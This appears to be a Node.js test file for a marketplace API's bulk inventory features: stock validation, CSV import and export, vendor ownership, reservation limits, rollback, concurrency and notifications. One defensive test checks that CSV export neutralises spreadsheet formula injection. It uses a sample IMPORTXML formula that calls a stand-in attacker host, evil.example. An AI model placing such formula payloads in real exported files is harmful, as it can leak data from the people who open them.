import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { once } from "node:events";
import { spawn } from "node:child_process";
import { createRequire } from "node:module";
import { resolve } from "node:path";
import test from "node:test";
import { signToken } from "../src/lib/auth.ts";
import { csvCell, parseBulkStockUpdates, updatesFromCsv } from "../src/lib/inventory-csv.ts";

const databaseRequire = createRequire(new URL("../../../lib/db/package.json", import.meta.url));
const { Pool } = databaseRequire("pg");
const databaseUrl = process.env.DATABASE_URL;
const suffix = randomUUID().replaceAll("-", "");
const apiPort = 18111;
const apiUrl = `http://127.0.0.1:${apiPort}/api`;
const paymentProviderMock = resolve(import.meta.dirname, "mock-payment-provider.mjs");

function auth(user) {
  return {
    Authorization: `Bearer ${signToken({ userId: user.id, email: user.email, role: user.role })}`,
    "Content-Type": "application/json",
  };
}

async function waitForHealthyServer(server, output) {
  for (let attempt = 0; attempt < 50; attempt += 1) {
    if (server.exitCode !== null) {
      throw new Error(`Test API exited before becoming healthy:\n${output.join("")}`);
    }
    try {
      const response = await fetch(`${apiUrl}/healthz`);
      if (response.ok) return;
    } catch {
      // The child process is still starting.
    }
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  throw new Error(`Test API did not become healthy:\n${output.join("")}`);
}

async function stopServer(server) {
  if (server.exitCode !== null) return;
  server.kill("SIGTERM");
  await once(server, "exit");
}

test("bulk inventory input rejects duplicate, blank, and malformed stock values", () => {
  assert.throws(
    () => parseBulkStockUpdates([{ variantId: 12, stock: 5 }, { variantId: 12, stock: 6 }]),
    /invalid or duplicate/,
  );
  for (const stock of ["", null, false]) {
    assert.throws(
      () => parseBulkStockUpdates([{ variantId: 12, stock }]),
      /invalid or duplicate/,
    );
  }
  assert.throws(
    () => updatesFromCsv("Variant ID,Stock\n12,\n"),
    error => error.message === "Fix the highlighted CSV rows and try again." &&
      error.details?.[0] === "Row 2 needs a whole-number Variant ID and Stock.",
  );
  assert.throws(
    () => updatesFromCsv("Variant ID,Stock\n12,not-a-number\n"),
    error => error.message === "Fix the highlighted CSV rows and try again." &&
      error.details?.[0] === "Row 2 needs a whole-number Variant ID and Stock.",
  );
  assert.throws(
    () => updatesFromCsv("Variant ID,Stock\n12,2.5\n"),
    error => error.message === "Fix the highlighted CSV rows and try again." &&
      error.details?.[0] === "Row 2 needs a whole-number Variant ID and Stock.",
  );
});

test("inventory CSV export keeps spreadsheet formulas inert and cells readable", () => {
  assert.equal(csvCell("=SUM(A1:A2)"), "\"'=SUM(A1:A2)\"");
  assert.equal(csvCell("+IMPORTXML(\"https://evil.example\", \"//A\")"), "\"'+IMPORTXML(\"\"https://evil.example\"\", \"\"//A\"\")\"");
  assert.equal(csvCell("SKU, \"quoted\""), "\"SKU, \"\"quoted\"\"\"");
  assert.equal(csvCell(null), "\"\"");
});

if (!databaseUrl) {
  test("bulk inventory safeguards require a database", { skip: "DATABASE_URL is required" }, () => {});
} else {
  test("bulk inventory updates enforce ownership, reservations, rollback, and aggregate concurrency", async () => {
    const pool = new Pool({ connectionString: databaseUrl });
    const created = { users: [], vendors: [], products: [], variants: [], orders: [], orderItems: [], returns: [], payouts: [] };
    const serverOutput = [];
    const server = spawn(process.execPath, ["--import", paymentProviderMock, "--enable-source-maps", "./dist/index.mjs"], {
      cwd: resolve(import.meta.dirname, ".."),
      env: { ...process.env, NODE_ENV: "test", PORT: String(apiPort) },
      stdio: ["ignore", "pipe", "pipe"],
    });
    server.stdout.on("data", chunk => serverOutput.push(chunk.toString()));
    server.stderr.on("data", chunk => serverOutput.push(chunk.toString()));

    async function query(text, values) {
      return pool.query(text, values);
    }

    async function bulk(user, updates) {
      return fetch(`${apiUrl}/vendors/inventory/variants/bulk-stock`, {
        method: "POST",
        headers: auth(user),
        body: JSON.stringify({ updates }),
      });
    }

    async function variantState(id) {
      const result = await query(
        "SELECT stock, reserved_stock FROM product_variants WHERE id = $1",
        [id],
      );
      return result.rows[0];
    }

    try {
      await waitForHealthyServer(server, serverOutput);

      const userResult = await query(
        `INSERT INTO users (email, name, role, referral_code) VALUES
          ($1, $2, 'vendor', $3),
          ($4, $5, 'vendor', $6),
          ($7, $8, 'shopper', $9),
          ($10, $11, 'admin', $12)
         RETURNING id, email, role`,
        [
          `inventory-a-${suffix}@example.com`, `Inventory Vendor A ${suffix}`, `inventory-a-${suffix}`,
          `inventory-b-${suffix}@example.com`, `Inventory Vendor B ${suffix}`, `inventory-b-${suffix}`,
          `inventory-buyer-${suffix}@example.com`, `Inventory Buyer ${suffix}`, `inventory-buyer-${suffix}`,
          `inventory-admin-${suffix}@example.com`, `Inventory Admin ${suffix}`, `inventory-admin-${suffix}`,
        ],
      );
      const [vendorAUser, vendorBUser, buyer, admin] = userResult.rows;
      created.users.push(...userResult.rows.map(user => user.id));

      const vendorResult = await query(
        `INSERT INTO vendors (user_id, brand_name, status) VALUES
          ($1, $2, 'approved'),
          ($3, $4, 'approved')
         RETURNING id, user_id`,
        [vendorAUser.id, `Inventory Brand A ${suffix}`, vendorBUser.id, `Inventory Brand B ${suffix}`],
      );
      const [vendorA, vendorB] = vendorResult.rows;
      created.vendors.push(...vendorResult.rows.map(vendor => vendor.id));

      const productResult = await query(
        `INSERT INTO products (vendor_id, name, price, stock) VALUES
          ($1, $2, 9, 9),
          ($3, $4, 7, 7)
         RETURNING id`,
        [vendorA.id, `Inventory Product A ${suffix}`, vendorB.id, `Inventory Product B ${suffix}`],
      );
      const [productA, productB] = productResult.rows;
      created.products.push(...productResult.rows.map(product => product.id));

      const variantResult = await query(
        `INSERT INTO product_variants
          (product_id, sku, attributes, stock, reserved_stock, low_stock_threshold) VALUES
          ($1, $2, '{"Size":"M"}'::jsonb, 5, 1, 2),
          ($1, $3, '{"Size":"L"}'::jsonb, 4, 1, 2),
          ($4, $5, '{"Size":"M"}'::jsonb, 7, 0, 2)
         RETURNING id, product_id`,
        [productA.id, `INV-A-M-${suffix}`, `INV-A-L-${suffix}`, productB.id, `INV-B-M-${suffix}`],
      );
      const [variantA, variantB, variantOtherVendor] = variantResult.rows;
      created.variants.push(...variantResult.rows.map(variant => variant.id));

      await query("UPDATE product_variants SET sku = $1 WHERE id = $2", [`=SUM(A1:A2)-${suffix}`, variantB.id]);
      const exportResponse = await fetch(`${apiUrl}/vendors/inventory/variants/export?productId=${productA.id}`, {
        headers: auth(vendorAUser),
      });
      assert.equal(exportResponse.status, 200);
      const exportedCsv = await exportResponse.text();
      assert.match(exportedCsv, /"'=SUM\(A1:A2\)-/);

      const crossVendorBefore = await variantState(variantOtherVendor.id);
      const crossVendorResponse = await bulk(vendorAUser, [{ variantId: variantOtherVendor.id, stock: 99 }]);
      assert.equal(crossVendorResponse.status, 400);
      assert.match((await crossVendorResponse.json()).error, /belong to your catalog/);
      assert.deepEqual(await variantState(variantOtherVendor.id), crossVendorBefore);

      const duplicateResponse = await bulk(vendorAUser, [
        { variantId: variantA.id, stock: 6 },
        { variantId: variantA.id, stock: 7 },
      ]);
      assert.equal(duplicateResponse.status, 400);
      assert.match((await duplicateResponse.json()).error, /invalid or duplicate/);

      const reservedBefore = await variantState(variantA.id);
      const reservedResponse = await bulk(vendorAUser, [{ variantId: variantA.id, stock: 0 }]);
      assert.equal(reservedResponse.status, 400);
      assert.match((await reservedResponse.json()).error, /below reserved stock/);
      assert.deepEqual(await variantState(variantA.id), reservedBefore);

      const rollbackBefore = await Promise.all([variantState(variantA.id), variantState(variantB.id)]);
      const rollbackResponse = await bulk(vendorAUser, [
        { variantId: variantA.id, stock: 6 },
        { variantId: variantB.id, stock: 0 },
      ]);
      assert.equal(rollbackResponse.status, 400);
      assert.match((await rollbackResponse.json()).error, /below reserved stock/);
      assert.deepEqual(
        await Promise.all([variantState(variantA.id), variantState(variantB.id)]),
        rollbackBefore,
      );

      const concurrentResponses = await Promise.all([
        bulk(vendorAUser, [{ variantId: variantA.id, stock: 8 }]),
        bulk(vendorAUser, [{ variantId: variantB.id, stock: 9 }]),
      ]);
      assert.deepEqual(concurrentResponses.map(response => response.status).sort(), [200, 200]);
      const aggregate = await query("SELECT stock FROM products WHERE id = $1", [productA.id]);
      assert.equal(Number(aggregate.rows[0].stock), 17);
      assert.deepEqual(
        await Promise.all([variantState(variantA.id), variantState(variantB.id)]),
        [
          { stock: 8, reserved_stock: 1 },
          { stock: 9, reserved_stock: 1 },
        ],
      );

      const csvImportResponse = await fetch(`${apiUrl}/vendors/inventory/variants/import`, {
        method: "POST",
        headers: auth(vendorAUser),
        body: JSON.stringify({ csv: `Variant ID,Stock\n${variantA.id},7\n` }),
      });
      assert.equal(csvImportResponse.status, 200);
      assert.equal((await variantState(variantA.id)).stock, 7);
      const invalidCsvBefore = await Promise.all([variantState(variantA.id), variantState(variantB.id)]);
      const invalidCsvResponse = await fetch(`${apiUrl}/vendors/inventory/variants/import`, {
        method: "POST",
        headers: auth(vendorAUser),
        body: JSON.stringify({ csv: `Variant ID,Stock\n${variantA.id},6\n${variantB.id},0\n` }),
      });
      assert.equal(invalidCsvResponse.status, 400);
      assert.match((await invalidCsvResponse.json()).error, /below reserved stock/);
      assert.deepEqual(
        await Promise.all([variantState(variantA.id), variantState(variantB.id)]),
        invalidCsvBefore,
      );

      const inventoryAlertResponse = await bulk(vendorAUser, [{ variantId: variantB.id, stock: 3 }]);
      assert.equal(inventoryAlertResponse.status, 200);

      const orderAlertResponse = await fetch(`${apiUrl}/orders`, {
        method: "POST",
        headers: auth(buyer),
        body: JSON.stringify({
          items: [{ productId: productA.id, variantId: variantA.id, quantity: 1 }],
          shippingAddress: "1 Alert Avenue",
          shippingCity: "Lagos",
          shippingState: "Lagos",
          shippingPhone: "08000000000",
        }),
      });
      assert.equal(orderAlertResponse.status, 201);
      const orderAlertOrder = await orderAlertResponse.json();
      created.orders.push(orderAlertOrder.id);
      created.orderItems.push(...orderAlertOrder.items.map(item => item.id));

      const returnOrderResult = await query(
        `INSERT INTO orders (
          user_id, status, total_amount, shipping_address, shipping_city, shipping_state, shipping_phone
        ) VALUES ($1, 'delivered', 9, '1 Alert Avenue', 'Lagos', 'Lagos', '08000000000') RETURNING id`,
        [buyer.id],
      );
      const returnOrderId = returnOrderResult.rows[0].id;
      created.orders.push(returnOrderId);
      const returnItemResult = await query(
        `INSERT INTO order_items (
          order_id, product_id, variant_id, vendor_id, quantity, unit_price,
          commission_rate, commission_amount, vendor_amount, fulfillment_status
        ) VALUES ($1, $2, $3, $4, 1, 9, 5, 0.45, 8.55, 'delivered') RETURNING id`,
        [returnOrderId, productA.id, variantA.id, vendorA.id],
      );
      const returnItemId = returnItemResult.rows[0].id;
      created.orderItems.push(returnItemId);
      const returnAlertResponse = await fetch(`${apiUrl}/returns`, {
        method: "POST",
        headers: auth(buyer),
        body: JSON.stringify({ orderId: returnOrderId, orderItemId: returnItemId, reason: "damaged" }),
      });
      assert.equal(returnAlertResponse.status, 201);
      created.returns.push((await returnAlertResponse.json()).id);

      const payoutResult = await query(
        "INSERT INTO payout_records (vendor_id, amount, status, reference) VALUES ($1, 250, 'pending', $2) RETURNING id",
        [vendorA.id, `inventory-payout-${suffix}`],
      );
      const payoutId = payoutResult.rows[0].id;
      created.payouts.push(payoutId);
      const payoutAlertResponse = await fetch(`${apiUrl}/admin/payouts/${payoutId}`, {
        method: "PATCH",
        headers: auth(admin),
        body: JSON.stringify({ status: "approved" }),
      });
      assert.equal(payoutAlertResponse.status, 200);

      const notifications = await query(
        "SELECT type FROM notifications WHERE user_id = $1 ORDER BY type",
        [vendorAUser.id],
      );
      assert.deepEqual(
        notifications.rows.map(notification => notification.type),
        ["order", "return", "inventory", "payout"],
      );
    } finally {
      try {
        if (created.vendors.length) {
          await query("DELETE FROM inventory_adjustments WHERE vendor_id = ANY($1::int[])", [created.vendors]);
        }
        if (created.users.length) {
          await query("DELETE FROM notifications WHERE user_id = ANY($1::int[])", [created.users]);
        }
        if (created.returns.length) {
          await query("DELETE FROM return_audit_events WHERE return_id = ANY($1::int[])", [created.returns]);
          await query("DELETE FROM returns WHERE id = ANY($1::int[])", [created.returns]);
        }
        if (created.payouts.length) {
          await query("DELETE FROM payout_records WHERE id = ANY($1::int[])", [created.payouts]);
        }
        if (created.orders.length) {
          await query("DELETE FROM inventory_reservations WHERE order_id = ANY($1::int[])", [created.orders]);
        }
        if (created.orderItems.length) {
          await query("DELETE FROM order_items WHERE id = ANY($1::int[])", [created.orderItems]);
        }
        if (created.orders.length) {
          await query("DELETE FROM orders WHERE id = ANY($1::int[])", [created.orders]);
        }
        if (created.variants.length) {
          await query("DELETE FROM product_variants WHERE id = ANY($1::int[])", [created.variants]);
        }
        if (created.products.length) {
          await query("DELETE FROM products WHERE id = ANY($1::int[])", [created.products]);
        }
        if (created.vendors.length) {
          await query("DELETE FROM vendors WHERE id = ANY($1::int[])", [created.vendors]);
        }
        if (created.users.length) {
          await query("DELETE FROM users WHERE id = ANY($1::int[])", [created.users]);
        }
      } finally {
        await pool.end();
        await stopServer(server);
      }
    }
  });
}